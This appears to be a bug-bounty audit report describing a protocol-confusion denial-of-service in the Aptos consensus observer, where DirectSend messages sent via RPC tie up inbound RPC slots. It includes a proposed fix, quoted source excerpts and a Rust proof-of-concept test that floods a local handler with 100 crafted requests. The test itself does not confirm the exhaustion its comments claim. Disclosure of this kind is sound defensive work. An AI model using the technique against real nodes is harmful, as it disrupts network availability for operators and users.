# Audit Report

## Title
Consensus Observer Filter_Map Bypass Enables RPC Resource Exhaustion via Protocol Confusion Attack

## Summary
The `filter_map` operation in `ConsensusObserverNetworkEvents::new()` does not perform actual message filtering, and the network handler lacks protocol validation, allowing attackers to send DirectSend messages via the RPC protocol. This causes RPC slot exhaustion, preventing legitimate subscription management and disrupting consensus observer functionality.

## Finding Description

The vulnerability exists in two locations that work together to enable the attack:

**Location 1**: The `event_to_request()` function always returns `Some()` for all network events, providing no actual filtering despite being used with `filter_map`: [1](#0-0) 

Both `Event::Message` and `Event::RpcRequest` variants return `Some(NetworkMessage)`, meaning the `filter_map` at line 53 never filters any events.

**Location 2**: The network handler ignores the `protocol_id` field and dispatches messages based solely on the `ConsensusObserverMessage` enum variant: [2](#0-1) 

At line 134, the `protocol_id` is explicitly ignored with the pattern `protocol_id: _`. The handler then switches on the message type at lines 140-146, calling `handle_observer_message()` for DirectSend messages regardless of whether they arrived via DirectSend or RPC protocol.

**Attack Mechanism**: 

An attacker can send `ConsensusObserverMessage::DirectSend` messages (OrderedBlock, CommitDecision, BlockPayload, OrderedBlockWithWindow) via `Event::RpcRequest` with `ProtocolId::ConsensusObserverRpc` instead of the intended `Event::Message` with `ProtocolId::ConsensusObserver`. 

When this occurs:
1. `event_to_request()` returns `Some(NetworkMessage)` with a `response_sender` 
2. Handler matches the DirectSend variant and calls `handle_observer_message()`
3. The `handle_observer_message()` function ignores the `response_sender` and simply forwards the message: [3](#0-2) 

4. The RPC sender never receives a response, causing the RPC slot to remain occupied until timeout

**Resource Exhaustion**: The network layer enforces RPC rate limits: [4](#0-3) 

With only 100 concurrent inbound RPC slots and a 5-second default timeout, an attacker can exhaust all RPC resources by sending 100 DirectSend messages via RPC. Once exhausted, legitimate Subscribe/Unsubscribe RPC requests are rejected with `RpcError::TooManyPending`, preventing consensus observer subscription management.

## Impact Explanation

**High Severity** - This vulnerability meets the Aptos bug bounty criteria for High Severity through multiple impact vectors:

1. **Validator Node Slowdowns**: Resource exhaustion degrades validator performance as RPC handlers are blocked
2. **Significant Protocol Violations**: Messages are processed via incorrect protocol channels, violating the separation between DirectSend and RPC protocols
3. **Availability Impact**: Consensus observer cannot establish new subscriptions or respond to publisher requests when RPC slots are exhausted
4. **Consensus Observer Disruption**: Prevents the consensus observer from syncing blockchain state, affecting validator operations that rely on it

The attack requires minimal resources (100 malicious messages every 5 seconds) to maintain persistent DoS conditions.

## Likelihood Explanation

**Likelihood: High**

- **Easy to Exploit**: Attacker only needs network connectivity to send messages via the wrong protocol
- **No Special Permissions**: Does not require validator access or privileged roles
- **Trivial to Execute**: Standard network message sending with wrong protocol ID
- **Hard to Detect**: Messages are still processed normally, making the resource leak subtle
- **Continuous Attack**: Attacker can maintain DoS by sending messages every 5 seconds

## Recommendation

Add protocol validation to ensure messages arrive via the correct protocol channel:

```rust
// In consensus/src/consensus_observer/network/network_handler.rs
// Around line 130 in the start() function

Some(network_message) = self.network_service_events.next() => {
    // Unpack the network message
    let NetworkMessage {
        peer_network_id,
        protocol_id,
        consensus_observer_message,
        response_sender,
    } = network_message;

    // Validate protocol matches message type
    let expected_protocol = match &consensus_observer_message {
        ConsensusObserverMessage::DirectSend(_) => {
            if response_sender.is_some() {
                error!(LogSchema::new(LogEntry::ConsensusObserver)
                    .message("DirectSend message received via RPC protocol"));
                continue; // Drop the malicious message
            }
            None // DirectSend should have no protocol_id
        },
        ConsensusObserverMessage::Request(_) => {
            if response_sender.is_none() {
                error!(LogSchema::new(LogEntry::ConsensusObserver)
                    .message("Request message received via DirectSend protocol"));
                continue; // Drop the malicious message
            }
            Some(ProtocolId::ConsensusObserverRpc)
        },
        ConsensusObserverMessage::Response(_) => {
            warn!(LogSchema::new(LogEntry::ConsensusObserver)
                .message("Received unexpected response"));
            continue;
        },
    };

    // Validate protocol_id matches expected
    if protocol_id != expected_protocol {
        error!(LogSchema::new(LogEntry::ConsensusObserver)
            .message("Protocol mismatch for message type"));
        continue;
    }

    // Process the consensus observer message
    match consensus_observer_message {
        ConsensusObserverMessage::DirectSend(message) => {
            self.handle_observer_message(peer_network_id, message);
        },
        ConsensusObserverMessage::Request(request) => {
            self.handle_publisher_message(peer_network_id, request, response_sender);
        },
        ConsensusObserverMessage::Response(_) => {
            // Already handled above
        },
    }
}
```

## Proof of Concept

```rust
// Test demonstrating the vulnerability
#[tokio::test]
async fn test_protocol_confusion_rpc_exhaustion() {
    use crate::consensus_observer::network::{
        network_events::ConsensusObserverNetworkEvents,
        network_handler::ConsensusObserverNetworkHandler,
        observer_message::ConsensusObserverMessage,
    };
    use aptos_config::{config::ConsensusObserverConfig, network_id::NetworkId};
    use aptos_crypto::HashValue;
    use aptos_network::{
        application::interface::NetworkServiceEvents,
        protocols::{
            network::{Event, NetworkEvents, NewNetworkEvents},
            wire::messaging::v1::{NetworkMessage as WireNetworkMessage, RpcRequest},
        },
    };
    use aptos_types::{
        block_info::BlockInfo,
        ledger_info::{LedgerInfo, LedgerInfoWithSignatures},
        aggregate_signature::AggregateSignature,
        PeerId,
    };
    use futures::StreamExt;

    // Create consensus observer config
    let config = ConsensusObserverConfig {
        observer_enabled: true,
        ..Default::default()
    };

    // Create network events channel
    let (sender, receiver) = aptos_channels::aptos_channel::new(
        aptos_channels::message_queues::QueueStyle::FIFO,
        100,
        None,
    );

    // Create network events
    let network_events = NetworkEvents::new(receiver, None, true);
    let mut network_and_events = std::collections::HashMap::new();
    network_and_events.insert(NetworkId::Public, network_events);
    let network_service_events = NetworkServiceEvents::new(network_and_events);

    // Create observer network events
    let observer_events = ConsensusObserverNetworkEvents::new(network_service_events);

    // Create network handler
    let (handler, mut observer_rx, _publisher_rx) = 
        ConsensusObserverNetworkHandler::new(config, observer_events);

    // Start handler
    tokio::spawn(handler.start());

    // Create malicious DirectSend message sent via RPC
    let ordered_block = ConsensusObserverMessage::new_ordered_block_message(
        vec![],
        LedgerInfoWithSignatures::new(
            LedgerInfo::new(BlockInfo::empty(), HashValue::zero()),
            AggregateSignature::empty(),
        ),
    );

    // Serialize the message
    let serialized = bcs::to_bytes(&ordered_block).unwrap();

    // Send 100 RPC requests with DirectSend message (exhausting RPC slots)
    for i in 0..100 {
        let (response_tx, _response_rx) = futures::channel::oneshot::channel();
        
        // Create RPC request with DirectSend message type
        let received_msg = aptos_network::protocols::network::ReceivedMessage {
            message: WireNetworkMessage::RpcRequest(RpcRequest {
                protocol_id: aptos_network::protocols::wire::handshake::v1::ProtocolId::ConsensusObserverRpc,
                request_id: i,
                priority: 0,
                raw_request: serialized.clone().into(),
            }),
            sender: aptos_config::network_id::PeerNetworkId::new(NetworkId::Public, PeerId::random()),
            receive_timestamp_micros: 0,
            rpc_replier: Some(std::sync::Arc::new(response_tx)),
        };

        // Send to network handler
        sender.push((PeerId::random(), aptos_network::ProtocolId::ConsensusObserverRpc), received_msg).unwrap();
    }

    // Wait for messages to be processed
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    // Verify 100 messages were forwarded (RPC slots consumed but no responses sent)
    let mut count = 0;
    while observer_rx.select_next_some().now_or_never().is_some() {
        count += 1;
    }
    assert_eq!(count, 100, "All 100 malicious messages should be processed");

    // At this point, all 100 RPC inbound slots are occupied with requests
    // that will never receive responses, causing RPC exhaustion
}
```

### Citations

**File:** consensus/src/consensus_observer/network/network_events.rs (L64-93)
```rust
    fn event_to_request(
        network_id: NetworkId,
        network_event: Event<ConsensusObserverMessage>,
    ) -> Option<NetworkMessage> {
        match network_event {
            Event::Message(peer_id, consensus_observer_message) => {
                // Transform the direct send event into a network message
                let peer_network_id = PeerNetworkId::new(network_id, peer_id);
                let network_message = NetworkMessage {
                    peer_network_id,
                    protocol_id: None,
                    consensus_observer_message,
                    response_sender: None,
                };
                Some(network_message)
            },
            Event::RpcRequest(peer_id, consensus_observer_message, protocol_id, response_tx) => {
                // Transform the RPC request event into a network message
                let response_sender = ResponseSender::new(response_tx);
                let peer_network_id = PeerNetworkId::new(network_id, peer_id);
                let network_message = NetworkMessage {
                    peer_network_id,
                    protocol_id: Some(protocol_id),
                    consensus_observer_message,
                    response_sender: Some(response_sender),
                };
                Some(network_message)
            },
        }
    }
```

**File:** consensus/src/consensus_observer/network/network_handler.rs (L130-155)
```rust
                Some(network_message) = self.network_service_events.next() => {
                    // Unpack the network message
                    let NetworkMessage {
                        peer_network_id,
                        protocol_id: _,
                        consensus_observer_message,
                        response_sender,
                    } = network_message;

                    // Process the consensus observer message
                    match consensus_observer_message {
                        ConsensusObserverMessage::DirectSend(message) => {
                            self.handle_observer_message(peer_network_id, message);
                        },
                        ConsensusObserverMessage::Request(request) => {
                            self.handle_publisher_message(peer_network_id, request, response_sender);
                        },
                        ConsensusObserverMessage::Response(_) => {
                            warn!(
                                LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                                    "Received unexpected response from peer: {}",
                                    peer_network_id
                                ))
                            );
                        },
                    }
```

**File:** consensus/src/consensus_observer/network/network_handler.rs (L169-191)
```rust
    fn handle_observer_message(
        &mut self,
        peer_network_id: PeerNetworkId,
        message: ConsensusObserverDirectSend,
    ) {
        // Drop the message if the observer is not enabled
        if !self.consensus_observer_config.observer_enabled {
            return;
        }

        // Create the consensus observer message
        let network_message = ConsensusObserverNetworkMessage::new(peer_network_id, message);

        // Send the message to the consensus observer
        if let Err(error) = self.observer_message_sender.push((), network_message) {
            error!(
                LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                    "Failed to forward the observer message to the consensus observer! Error: {:?}",
                    error
                ))
            );
        }
    }
```

**File:** network/framework/src/constants.rs (L13-15)
```rust
pub const MAX_CONCURRENT_OUTBOUND_RPCS: u32 = 100;
/// Limit on concurrent Inbound RPC requests before backpressure is applied
pub const MAX_CONCURRENT_INBOUND_RPCS: u32 = 100;
```
